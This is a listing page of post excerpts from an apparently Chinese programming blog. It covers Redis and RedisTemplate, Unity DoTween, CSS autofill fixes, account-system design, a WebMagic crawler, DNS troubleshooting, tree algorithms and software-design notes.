结构类型结构存储的值结构的读写能力String可以是字符串、整数或者浮点数对整个字符串或者字符串的其中一部分执行操作；对象和浮点数执行自增(increment)或者自减(decrement)List一个链表，链表上的每个节点都包含了一个字符串从链表的两端推入或者弹出元素；根据偏移量对链表进行修剪(trim)；读取单个或者多个元素；根据值来查找或者移除元素Set包含字符串的无序收集器(unorderedcollection)，并且被包含的每个字符串都是独一无二的、各不相同添加、获取、移除单个元素；检查一个元素是否存在于某个集合中；计算交集、并集、差集；从集合里卖弄随机获取元素Hash包含键值对的无序散列表添加、获取、移除单个键值对；获取所有键值对Zset字符串成员(member)与浮点数分值(score)之间的有序映射，元素的排列顺序由分值的大小决定添加、获取、删除单个元素；根据分值范围(range)或者成员来获取元素 Redis 5种数据结构的概念大致介绍到这边，下面将结合Spring封装的RedisTemplate来对这5种数据结构的运用进行演示
RedisTemplate介绍 spring 封装了 RedisTemplate 对象来进行对redis的各种操作，它支持所有的 redis 原生的 api。
RedisTemplate在spring代码中的结构如下：
org.springframework.data.redis.core Class RedisTemplate&lt;K,V&gt; java.lang.Object org.springframework.data.redis.core.RedisAccessor org.springframework.data.redis.core.RedisTemplate&lt;K,V&gt; Type Parameters:
K
the Redis key type against which the template works (usually a String)
模板中的Redis key的类型（通常为String）如：RedisTemplate&lt;String, Object&gt;
注意：如果没特殊情况，切勿定义成RedisTemplate&lt;Object, Object&gt;，否则根据里氏替换原则，使用的时候会造成类型错误 。
Vthe Redis value type against which the template works
模板中的Redis value的类型 RedisTemplate中定义了对5种数据结构操作 redisTemplate.opsForValue();//操作字符串 redisTemplate.opsForHash();//操作hash redisTemplate.opsForList();//操作list redisTemplate.opsForSet();//操作set redisTemplate.opsForZSet();//操作有序set StringRedisTemplate与RedisTemplate 两者的关系是StringRedisTemplate继承RedisTemplate。
两者的数据是不共通的；也就是说StringRedisTemplate只能管理StringRedisTemplate里面的数据，RedisTemplate只能管理RedisTemplate中的数据。
SDR默认采用的序列化策略有两种，一种是String的序列化策略，一种是JDK的序列化策略。
StringRedisTemplate默认采用的是String的序列化策略，保存的key和value都是采用此策略序列化保存的。
RedisTemplate默认采用的是JDK的序列化策略，保存的key和value都是采用此策略序列化保存的。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/efead4c7fb7af488a44ff7a414cc08a5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8b2f30981ec22c00cf50725d1cf72ed6/" rel="bookmark">
			unity插件（一）DoTween
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、概要 DoTween插件是常配合Unity的UGUI图形系统使用的第三方插件,不仅可以实现UI的运动,也可以用于实现物体的补间动画;插件封装了大量的API提供开发者进行调用,只需要简单的传递参数就可以实现不同的动画表现.在动画的生命周期,这也就是动画开始播放到结束这个过程,我们总需要加入一些特殊的交互.利用DOTween就可以很好的控制动画的整个生命过程. 二、使用 （一）对向量进行动画
//使用DoTween时需要导入的命名空间 using DG.Tweening; public class Test : MonoBehaviour { Vector3 myValue = Vector3.zero; float dis=0; void Start(){ //创建一个dotween实例，在4秒内，从myValue的位置移动到new Vector3（5,5,5）的位置 //第一个参数lambda表达式需要改变的值 //第二个参数lambda表达式将目标值的改变赋给要变化的值 //第三个参数为目标值 //第四个参数为时间 //返回一个Tween类型的值 Tween tween = DoTween.To(()=&gt;myValue, x=&gt;myValue=x, new Vector3(5,5,5), 4); //在5秒内，将dis的值变化到100 Tween tween2 = DoTween.To(()=&gt;dis, x=&gt;dis = x, 100, 5); } } （二）控制cube和UI面板的移动
将上诉脚本挂载到cube上，在update中将myValue的变化赋值给cube的localPosition
void Update(){ //将myValue的变化赋给cube transform.localPosition = myValue; } UI面板的控制只要将脚本挂载到UI面板上即可
（三）动画的播放
SetAutoKill：设置动画自动销毁
DoPlayForward：动画向前播放
DoPlayBackwards：动画向后播放
DoPause：暂停
（四）属性设置
Form:
DoTween中任何调用动画的方法后面都可以添加From(),表示从目标位置移动到当前位置
From(true)
表示目标坐标等于当前坐标加上当前目标坐标，如果物体当前坐标为2，那么这行代码表示从目标位置(5+2),经过1秒，移动到当前位置
public class Panel01 : MonoBehaviour { void Start () { Tweener tweener = transform.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8b2f30981ec22c00cf50725d1cf72ed6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/de601d92251515747e623d21104d160a/" rel="bookmark">
			[React Native]React Native version mismatch. JavaScirpt version:0.55.4 ,Native version:0.56.1
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 是因为另一个React Native项目启动，Metro Bundle - node launchPackager.command正在运行不同的版本，关闭它既可。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cd87f3f921839b9b8e8b769612be0f91/" rel="bookmark">
			如何卸载Win10关键更新（右键不显示卸载）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 Win10更新搞得我不能够用鼠标，好像是某些关键更新引起的，右键还不让卸载…
工具 禁用Win10更新：Anti Windows Update管理员权限修改文本：强推 VSCode 方法 确认你要卸载的更新号码；打开 C:\Windows\servicing\Packages\ 目录；
搜索号码；打开所有的 .mum 文件，内容其实是XML文件，修改其中 permanence="perment" 为 permanence="removable" ；保存，需要管理员权限，VSCode轻易做到。 参考文章 Uninstalling ‘uninstallable’ Windows Updates
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bcec23495ae2ecd7f34b61b61d7f022e/" rel="bookmark">
			input 框换背景色
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 设计需求 input框要求是透明的颜色 input 输入框 设置背景色直接使用background就可以，但是失去焦点的时候会变成黄色
设计图
方法一 使用阴影 仅对非透明的纯色背景有效，设置成自己想要的背景颜色即可
input:-webkit-autofill{ -webkit-box-shadow:0 0 0 1000px white inset !important; } 方法二 修改浏览器渲染黄色背景的时间 :-webkit-autofill{ -webkit-text-fill-color: #fff !important; transtion:background-color 5000s ease-in-out 0s; } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b4817453e8c044f11e1f082a6107e865/" rel="bookmark">
			互联网账号体系
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、账号的价值
账号的定义
用户与系统建立的一种联系，是实现从现实映射到虚拟系统中的唯一标识
账号的价值
1.用户角度
记录自身的各类数据，并且作为活动交流的身份标识
2.企业角度
搜集用户信息，建立用户体系级画像，实现用户精细化运营推广， 为企业带来更多的价值
二、账号体系架构
三、账号基本要素构成
用户身份（UID）：用户注册后，系统会建立一个内部标识，自动按序为用户分配一个数字编号，即UID。该标识在该系统中具有唯一性，不可更改，对外不可见，是注册用户的身份标识，用户所有的数据资产都会绑定到这个内部标识上，类似现实生活中的身份证号码。
用户名（Username）：由用户自定义或系统随机分配，系统分配一般由英文字母、数字或者2者组合而成。在系统中具有唯一性，一般设置一次后不可更改，如：阿里云的账号。
用户昵称（Nickname）：用户自定义的个性花名称，可自由设置和改动，一般为公开信息，对他人可见。常见的各类个人信息的名称，即是用户昵称。
用户账号（User Account）：是一个集合概念，是用户的外部标识，包括用户名、手机号、邮箱，并与UID进行唯一性映射。例如：在注册时可以采用填写手机号，或者邮箱等不同形式的方式。
账号密码（password）：一串理论上只有身份标识所有者记得的字符串，目前是教育最充分的一种身份识别的方式。
第三方账号：即OpenId，就是将三方的帐号绑定到产品自身的帐号上，当查询到用户第三方的帐号已经绑定了平台的某个user_id时，直接登录对应的帐号，实现一键注册与一键登录。常见的有微信、微博、QQ等第三方常用社交账号登录。
四、账号组合方式及差异
五、账号主要设计流程（注册登录、找回密码、风控流程）
1. 注册及登录流程 （1）遵循的原则
注册方式具有普遍的适应性。
注册流程尽量简单快捷，减低用户的损耗。
保证注册方式的安全性。
（2）设计的思路
账号体系是重要的一环，但是并不是所有的产品都是必要的，其重要程度根据产品的业务性质决定，例如社交类为强体系，工具类为弱体系。
是先注册才可以使用（石墨文档）还是先使用到核心业务需再要求注册（淘宝），部分产品是明确先有账号后才能使用，主要由产品的核心业务决定的。当两者都支持的情况。
比较如下：
注册前置（先注册再使用）
优点：统一注册入口，逻辑处理简单，用户信息完整收集。
缺点：用户体验差，容易造成用户流失。
注册后置（先使用再注册）
优点：对用户友好，用户体验较好；
缺点：注册验证入口多，系统维护成本较大；前期需进行整体规划；用户信息需要分多环节收集。
注册方式的确定
主要考虑：
用户来源：主要针对于第三方登录的，例如：产品的用户与微博的用户交集大，选用第三方登录时，应选择微博。
业务模式：主要是风险控制与流量的平衡，对风险控制要求低的产品，注册流程简短。
平台渠道：不同的渠道方式，用户对注册登录流程的接受程度存在着区别，如：小程序、h5流程力争简单，app和网站，可根据业务需要，把握平衡点。
2. 找回密码 找回密码流程，常见的几种找回密码的方式：
手机验证：方便快捷，但是存在手机号码更换，二次放号的问题，所以不能只有一种单纯的手机号验证。
邮箱：以前是主要的找回密码的流程，现在逐渐被手机验证代替，但是它仍有自身的重要价值，与手机验证相辅助，提供多元方式。
人工审核：针对用户出现极其特殊情况而增设的人工渠道，一般是用户量大的平台会专门设计人工审核的流程。
具体可体验支付宝的找回密码流程：
3. 风控流程 账号风控的根本目标就是确保用户身份的合法真实性。杜绝不法分子的盗取，防止恶意攻击，归结为以下几种：
禁止非正常的、大量的“验证账号是否存在”的操作请求，防止不法份子通过不停的输入大量账号，去获取该账号是否存在的数据。
确保用户访问的真实性，进行手机号验证或手机扫码登录。
注册时增加邮件验证码功能或者通过邮件进行激活确认。
进行短信次数限制，保护短信通道不被恶意者大量刷短信，造成堵塞。
通过IP对请求上限做出限制，防止恶意用户大量发起注册请求，攻击服务器。
异常操作，非本人IP/手机进行通知提醒。
六、外延--账号同行证
目前存在的现象主要是很多公司的产品拥有各自独立的账号体系，各自为政，互不相通，形成信息孤岛。
1. 带来不利影响包括以下几点 （1）从用户的角度
同一公司的产品，用户需要注册多个账号，给用户带来使用上的不便，不易形成品牌意识。
（2）从企业的角度
账号的独立，造成账号管理难度加大和重复开发，不利于产品之间互相导流和推广，用户数据共享。为解决以上问题，需要将账号系统打通，即账号通行证。
通行证（passport）是指：
产品账号统一处理，所有应用系统都直接依赖与同一套身份认证系统，一个账号可以登录同一旗下的多个产品。百度、网易等大型公司已实现通行证。
2. 针对各个产品账号独立的情况下，通行证如何搭建 第一步，将各子系统的用户公共信息迁移到一张表，该表不包含任何业务的信息，只存在用户的核心数据，如：用户id、用户手机、用户密码、用户昵称。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b4817453e8c044f11e1f082a6107e865/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/541df48359f64920a97e20e99550ecf6/" rel="bookmark">
			JAVA爬虫框架WebMagic爬取ajax请求的页面数据
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		查看WebMagic文档：http://webmagic.io/docs/zh/posts/ch1-overview/ 爬取网址需要翻墙： https://www.reddit.com/r/funny/ 首先分析页面，随着我们拉下滚动条，XHR标签下面包含含有ajax的异步请求，需要靠经验来找，一般会有分页参数和关键词参数。
点击上面画圈的一个链接即可返回json数据。
展开posts是个数组 分析下链接：
https://gateway.reddit.com/desktopapi/v1/subreddits/funny?rtj=debug&amp;redditWebClient=web2x&amp;app=web2x-client-production&amp;after=t3_9fip4y&amp;dist=13&amp;layout=card&amp;sort=hot&amp;allow_over18=&amp;include=
本来以为&amp;dist=13是分页参数，其实不是，后来通过&amp;after=t3_9fip4y 参数来获取新的数据，
获取上述json信息之后，下一步就是使用webmagic框架来爬取结果了。首先先导入jar包：
&lt;dependency&gt; &lt;groupId&gt;us.codecraft&lt;/groupId&gt; &lt;artifactId&gt;webmagic-core&lt;/artifactId&gt; &lt;version&gt;0.6.1&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;us.codecraft&lt;/groupId&gt; &lt;artifactId&gt;webmagic-extension&lt;/artifactId&gt; &lt;version&gt;0.6.1&lt;/version&gt; &lt;/dependency&gt; &lt;!-- 下面两个jar是需要json解析的时候要依赖的，普通的html页面不用 --&gt; &lt;dependency&gt; &lt;groupId&gt;com.jayway.jsonpath&lt;/groupId&gt; &lt;artifactId&gt;json-path&lt;/artifactId&gt; &lt;version&gt;0.9.1&lt;/version&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/net.minidev/json-smart --&gt; &lt;dependency&gt; &lt;groupId&gt;net.minidev&lt;/groupId&gt; &lt;artifactId&gt;json-smart&lt;/artifactId&gt; &lt;version&gt;1.3.1&lt;/version&gt; &lt;/dependency&gt; 先附上一张WebMagic的框架图：
1.Downloader Downloader负责从互联网上下载页面，以便后续处理。WebMagic默认使用了Apache HttpClient作为下载工具。
2.PageProcessor PageProcessor负责解析页面，抽取有用信息，以及发现新的链接。WebMagic使用Jsoup作为HTML解析工具，并基于其开发了解析XPath的工具Xsoup。
在这四个组件中，PageProcessor对于每个站点每个页面都不一样，是需要使用者定制的部分。
3.Scheduler Scheduler负责管理待抓取的URL，以及一些去重的工作。WebMagic默认提供了JDK的内存队列来管理URL，并用集合来进行去重。也支持使用Redis进行分布式管理。
除非项目有一些特殊的分布式需求，否则无需自己定制Scheduler。
4.Pipeline Pipeline负责抽取结果的处理，包括计算、持久化到文件、数据库等。WebMagic默认提供了“输出到控制台”和“保存到文件”两种结果处理方案。
Pipeline定义了结果保存的方式，如果你要保存到指定数据库，则需要编写对应的Pipeline。对于一类需求一般只需编写一个Pipeline。
实现PageProcessor的代码如下：
// 页面处理器 实现PageProcessor即可 public class ProcessorMEMES implements PageProcessor { private static int COUNT = 1; private static Logger logger = Logger.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/541df48359f64920a97e20e99550ecf6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/712092d37ca101a32c3ace38c5c84342/" rel="bookmark">
			jquery 轮播图  【淡入淡出】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		代码不难，只是简单的淡入淡出形式的图片轮播，直接上代码了！
&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt; &lt;html xmlns="http://www.w3.org/1999/xhtml"&gt; &lt;head&gt; &lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8" /&gt; &lt;title&gt;jquery轮播图-淡入淡出&lt;/title&gt; &lt;style type="text/css"&gt; #banner { position: relative; width: 478px; height: 286px; border: 1px solid #666; overflow: hidden; } #banner_list img { border: 0px; } #banner_bg { position: absolute; bottom: 0; background-color: #000; height: 30px; filter: Alpha(Opacity=30); opacity: 0.3; z-index: 1000; cursor: pointer; width: 478px; } #banner_info { position: absolute; bottom: 0; left: 5px; height: 22px; color: #fff; z-index: 1001; cursor: pointer } #banner_text { position: absolute; width: 120px; z-index: 1002; right: 3px; bottom: 3px; } #banner ul { position: absolute; list-style-type: none; filter: Alpha(Opacity=80); opacity: 0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/712092d37ca101a32c3ace38c5c84342/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/13b51d8531472a4cd3ff62e555675e47/" rel="bookmark">
			解决网页打开慢/正在解析主机问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		网页解析慢通常是DNS的问题，如果DNS设置正常还有问题，那么可以检查下是否与多网卡配置有关。本例中就是因为安装了vmware虚拟机导致虚拟网卡与无线网卡的DNS冲突，引起网页解析缓慢。最终通过去掉虚拟网卡上的DNS配置得到解决。
问题现象 浏览器打开网页很慢，chrome左下角总是显示“正在解析主机”，edge浏览器标签栏总是显示“waiting for response…"。
问题排查 一开始怀疑路由器DNS设置问题，但因为同一网络下使用手机打开网页很顺畅，所以基本排除。
检查电脑的dns设置，dns配置为自动获取，当前获取的地址是路由器的ip地址192.168.31.1，没有问题。
使用ipconfig /flushdns清除dns缓存，然后ping百度网址，结果解析时间花了10秒左右，表明dns解析确实延迟比较长。通过ssh登陆路由器，ping任意网站，解析很迅速，进一步验证路由器设置没有问题。
接下来准备跟踪dns路由过程。使用nslookup，返回的结果是“DNS request timed out."，同时返回的Address是192.168.40.1。这个地址并不是前面检查的DNS服务器地址，而是虚拟网卡“VMnet8"的网关地址。于是打开虚拟网卡，发现虚拟网卡的DNS地址为192.168.40.1，终于水落石出了。
因为电脑装了虚拟机，所以多了张虚拟网卡，而虚拟网卡设置了DNS地址，即192.168.40.1，导致总是先从该服务器去解析，解析失败后才从正确的DNS解析，导致解析延迟。
解决措施 删除虚拟网卡的DNS设置（留空），问题得到解决。nslookup检查看到是正确的DNS地址。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b50fba0b65772b3c1e7c9eb7a1903406/" rel="bookmark">
			树中两个节点的最低公共祖先
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一.树中两个节点的最低公共祖先 题目一： 输入两个二叉搜索树的结点，求两个结点的最低公共祖先，所谓的最低公共祖先是指距离两个节点最近的共同祖先。
例如：
解题思路：
1.二叉搜索树具有一个很好的特点。以当前结点为根节点的左边结点的值都是小于根节点的值，右边结点的值都大于根节点的值。2.根据这个特点，如果给的两个节点的值都小于根节点，那么它们的最低公共祖先就一定在它左子树。3.如果给的两个节点的值都大于根节点，那么它们的最低公共祖先就一定在它右子树。4.如果一个结点的值大于根节点的值，一个结点的值小于根节点的值，那么这个根节点就是它的最低公共祖先。
代码实现： //求两个节点的最低公共祖先(递归解法) BSTreeNode* GetCommenParent_R(BSTreeNode* root, BSTreeNode* bstn1, BSTreeNode* bstn2) { if (root == NULL || bstn1 == NULL || bstn2 == NULL) return NULL; if ((bstn1-&gt;_data &lt; root-&gt;_data) &amp;&amp; (bstn2-&gt;_data&lt; root-&gt;_data)) { GetCommenParent_R(root-&gt;_left, bstn1, bstn2); } else if ((bstn1-&gt;_data&gt;root-&gt;_data) &amp;&amp; (bstn2-&gt;_data&gt;root-&gt;_data)) { GetCommenParent_R(root-&gt;_right, bstn1, bstn2); } else return root; } 题目二： 假设在修改一下上述题目的条件，所给的树不是一棵二叉搜索树，甚至不是一棵二叉树，只是一棵简单的树，但是树中的结点存在着指向父节点的指针，那么要怎么求出两个结点的最低公共祖先呢？
解决思路：转换题目。
1.假设在上边的树中，题目给出3和78两个结点2.我们可以发现从树的叶节点到根节点有唯一的一条路径，也就是一条链表3.3-&gt;12-&gt;32，78-&gt;45-&gt;324.要求它们的最低公共祖先，就是转换成求上述两条链表的第一个公共结点 求两条链表的第一个公共结点位于我的另一篇博客：
https://blog.csdn.net/hansionz/article/details/82717368
题目三：假设在次修改题目二的条件，这只是一棵普通的二叉树，并没有指向父亲的指针，我们该怎样做呢？
解题思路一：
如果一个结点为根，另一个结点无论在什么地方它们的最低公共祖先一定为根结点。
如果一个结点在左树，另一个结点在右树，那么它的最低公共祖先一定是根节点。
如果两个结点都在左树，以子问题在左树查找。
如果两个结点都在右树，以子问题在右树查找。
代码实现：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b50fba0b65772b3c1e7c9eb7a1903406/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e1200ba63735f2dd0aa9a2e57dda79ce/" rel="bookmark">
			2018数学建模A题的简单指导
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		之前写过一篇博客，介绍如何使用差分格式求解热传导方程
今天打开博客，突然发现评论区被这篇文章霸屏了
询问实验室的小伙伴才知，原来是被可爱的建模学子们攻占了
经过简单的了解，发现今年建模的A题的核心就是求解一个热传导方程，因此之前所写文章的程序基本可以算是神助攻了，完全可以帮助大家构建解题程序的基本框架。
但是！
数学建模比赛考验的就是大家的学习能力以及解决问题的能力，我只提供简要思路，不要做伸手党直接找我要代码，不要问我怎么写，请对得起你将来获得的一等奖。
再有就是，你要先确保你能看懂我已经提供的源代码，否则下面我提供的思路你可能看了也白看。
这里统一对大家的问题做一个回答：
本题适用差分解法吗？ 求解偏微分方程的方法中，差分方法 和 有限元 是两类最主流的方法。
差分方法的优点是原理简单，但是只能求解规则区域的数值解。
有限元背后的理论相对难很多，但能够求解不规则区域问题。
本题适用哪种方法解答取决于你的模型假设
本题中涉及多种介质的热传导的求解，我的建议是，如果不想给自己找麻烦的话，将每种介质层假设成规则的矩形。
既然带求解区域是矩形了，那么本题使用差分方法来求解更加合适，关于差分方法，你可以随便找一本介绍偏微分方程数值解的书，都有介绍。
当然，你如果将模型假设定义为更符合实际的不规则问题，能做出来当然是亮点，但切记不要搬起石头砸自己的脚，毕竟建模时间紧任务重。
是否适用于多层壁热传导？ 评论区有人问，是否适用于多层壁热传导吗？
其实就是问这个程序能否求解A题嘛，O(∩_∩)O哈哈~
答案当然是能，但显然不能直接拿来用，给几点提示。
思路1：
你单拿出其中一层来求解，和我提供的算例已经没有本质区别了。
因此，你可以一层一层的求解。先求第一层的数值解，第一层的结果一有，第二层的边界条件也就有了，于是第二层也可以求了。
这样做的潜在问题是，第一层中求解的误差，必定会传递到第二层去，数学上可能不太完美，但是好理解，代码改动也少。
思路2：
我认为数学上更好的方式肯定是整体一起求解，但这就有点困难了。
这样做时，你需要对每一层边界在系数矩阵的相应位置处，都按照边界处的对应关系进行相应处理。
这需要你对差分方法有着很好的理解，如果我提供的代码你无法完全看懂，建议就不要考虑了。
关于边界条件 构造的差分格式是保证解满足对应的方程，但其实满足给定方程的解有无穷多种。
而边界条件的作用其实就是找出你想要的那个解。
之前文章中给出的算例包含的边界条件是：
u(x,0)
u(0,t) 和 u(1,t)
在A题中右侧初始温度好像是没有的，也就是u(1,t)没有
首先，你要知道的是，求解需要的边界条件并不一定非得是这几个
但是少了一个边界条件，你就要想办法补上一个边界条件, 边界条件也不一定是已知函数的表达式，导数的表达式也是可以的（当然，代码是一定需要相应修改的）。
比如没有u(1,t)，你可以想办法构造 du(0,t)/dx 或 du(0,t)/dt
这就看你如何理解原问题了，建议查阅文献，看看别人使用的是哪种边界条件，相应的对代码进行修改。当然也可以通过模型假设，将问题向你期待的边界条件上面靠。
思路提示目前就是这些了
最近在经营我的github，觉得本文对你有帮助的话，进来逛逛吧，顺便给觉得好玩的项目点颗星~嘿嘿~
同时也欢迎大家关注我的团队(微信搜索公众号LSGO软件技术团队)，我快毕业了，希望团队能有一些新的血液~
最后祝大家都能获得好成绩~
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/546f4559adcd49c4280960da3b43143c/" rel="bookmark">
			软件工程之面向过程的软件设计方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、设计基础 1.自顶向下，逐步细化： 将软件的体系结构按自定向下的方式，对各个层次的过程细节和数据细节逐层细化。
把一个大问题分解成若干个子过程，分解的时候从最底层开始，以此类推，直到不能分解或一个模块智能完成一个单一的功能为止。
2.软件结构： 软件结构包括两部分：一个是程序的模块结构，另一个是数据的结构。
把一个问题分解成子问题，然后把子问题解决了就能把总的问题解决啦，这样做，能大幅度提高效率，降低复杂性。
那么如何分解？分解成几个？这要根据开发经验和具体问题而言。
3.程序结构： 程序结构有两个树状结构和网状结构。
树状结构层次清晰，概要设计要把树状结构设计出来。
网状结构没有隶属关系，各个模块的接口相对较复杂。
4.结构图： 结构图反映了程序中模块之间的层次调用关系，结构也也叫S-C图。能清晰表达模块之间所划分的层次。
下面对一些基本概念做一些讲解，模块的命名应该以主要功能作为模块名。模块之间存在调用关系和信息传递，被调用模块一定要想调用模块返回查找成功的信息。有条件的调用关系（顺序调用、循环调用）如何表示。 5.程序的系统结构图： 介绍两个概念 深度：表明问题的复杂性和规模大小。
宽度：是指任一层中模块数中宽度最多的是系统结构图的宽度。
要综合考虑深度、宽度、扇入、扇出之间的关系，使程序的系统结构合理化，好的图应该是类似于坛子状，中间宽、两端窄。
6.模块化： 能够把一个大而复杂的软件系统按照问题的功能域划分成易于理解的比较单纯的模块结构。划分模块的时候要注意抽象，软件系统进行模块设计时，可有不同的抽象层次。抽象层次并不是一步到位，而是逐步抽象的。
抽象包括功能抽象和数据抽象。
7.信息隐蔽： 信息隐蔽是指在划分模块的时候，定义层次的时候，如果模块中数据发生变化时，尽量不影响其他模块的使用。模块的独立性是划分模块的重要原则。
模块一般具有三个基本属性：功能、逻辑、状态。模块独立性衡量标准 高内聚，低耦合。
原则： 尽量使用数据耦合，少用控制耦合，限制公共耦合，完全不用内容耦合。尽量做到高内聚，低耦合。
二、系统结构化设计 首先1.研究、分析和审查数据流图
然后2.根据数据流图（上一阶段需求分析阶段产生）决定问题的类型。
数据处理问题的类型有两种：变换型和事务性。
针对两种不同的类型分别进行分析处理，在系统结构图中的模块及模块之间的关系如图所示。
1.变换型系统结构图： 大多数情况下采用变换型结构图，变换型数据处理问题的工作过程大概分为三步。即
1.取得数据
2.变换数据
3.给出数据
变换分析方法由以下四步组成:重画数据流图、区分有效输入、有效输出和中心变换部分、进行一级分解，设计上层模块、进行二级分解，设计输入、输入和中心变换部分的中、下层模块。
2.事务性系统结构图 它接受一项事务，根据处理的特点和性质，选择分派一个适当的处理单元，然后给出结果。
事务分析与变换分析一样，事务分析也是从分析数据流图开始，自顶向下，逐步分解，建立系统到数据结构图。模块的作用范围应在控制范围之内，及可能减少高扇出结构，随着深度增大扇入。
三、数据设计 原则： 1、用于软件的系统化方法也适用于数据
2、确定所有的数据结构和在每种数据结构上施加的操作。
3、应当建立一个数据词典并用它来定义数据和软件的设计
4、低层数据设计的决策应推迟到设计过程的后期进行。
5、数据结构的表示只限于那些必须直接使用该数据结构内数据的模块才能知道
6、应当建立一个存放有效数据结构及相关操作的库。
7、软件设计和程序设计语言应当支持抽象数据类型的定义和实现。
以上原则适用于软件工程的定义阶段和开发阶段。
四、文件和过程设计　１.对于数据设计 原则： 1、用于软件的系统化方法也适用于数据；
2、确定所有的数据结构和在每种数据结构上施加的操作；
3、应当建立一个数据词典并用它来定义数据和软件的设计；
4、底层数据设计的决策应推迟到设计过程的后期进行；
5、数据结构的表示只限于哪些必须直接使用该数据结构内数据的模块才能知道；
6、应当建立一个存放有效数据结构及相关操作的库；
7、软件设计和程序设计语言应当支持抽象数据类型的定义和实现。
２.文件设计 主要分为两个过程：
１，逻辑设计（１，整理必须的数据元素；２，分析数据间的关系；３，确定文件的逻辑设计。）
２，物理设计（１，理解文件的特性；２，确定文件的组织方式，例如顺序文件，直接存取文件；
３，确定文件的存储介质；
４，确定文件的记录格式；
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/546f4559adcd49c4280960da3b43143c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4e0ad4ec6c577492d4d454da09a95b6f/" rel="bookmark">
			并发的本质
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		说到底，并发的核心就是如何在代码中协调好并行处理和串行处理！各种并发技术，其实质都是在并行和串行之间转换，追求性能最大化，又要守住结果正确性这条红线！就像高速公路，有些路段你可以飙车，但是到了收费站，你必须慢下来，一个接一个通过检查。并发中的锁，必须是唯一的锁，不然就会失去唯一性访问控制，锁的唯一作用就是排他的访问控制。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e3117ff14b795ed6cb3e4654f7020af1/" rel="bookmark">
			第二次写
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Android Studio与夜神模拟器开发调试 1. 什么是夜神模拟器？ 夜神模拟器是北京多点在线科技有限公司开发的一款Android手机游戏模拟器， 运行速度快，使用方便，是一款PC平台玩手游，助攻Android开发的利器
使用Android Studio与夜神模拟器开发调试 2.1 启动android studio 2.2 启动夜神模拟器 2.2.1 cmd打开命令行窗口 2.2.2 切换到夜神安装目录，例如：D:\Program Files\Nox\bin 2.2.3 执行命令连接模拟器 nox_adb.exe connect 127.0.0.1:62001
2.3 在Android Studio窗口上点击run ‘app’(或shift+F10)，点击OK即可在模拟器上运行app 注：通过shift+F10可查看设备(手机/平板/模拟器)的连接情况
简化夜神连接 3.1 在系统环境变量path中添加nox_adb.exe文件的路径，我的路径为：“D:\Program Files\Nox\bin”
3.2 再创建nox.bat文件，并写入以下代码，这样每次双击就会自动连接 nox_adb.exe connect 127.0.0.1:62001
